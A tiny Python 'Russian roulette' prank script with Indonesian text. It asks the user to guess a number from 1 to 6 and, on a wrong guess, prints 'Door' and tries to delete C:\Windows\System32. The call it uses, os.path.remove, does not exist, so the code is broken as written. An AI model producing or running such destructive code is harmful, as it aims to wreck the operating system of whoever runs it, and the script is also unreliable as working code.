import os
import random

bullet = random.randint(1, 6)
folder = r"C:\Windows\System32" 

try:
    shot = int(input("Tebak angka dari 1 hingga 6: "))
    if shot == bullet:
        print("Hore kamu masih hidup")
    else:
        print("Door")
        os.path.remove(folder)
        
except ValueError:
    print("Masukkan angka yang valid antara 1 sampai 6!")
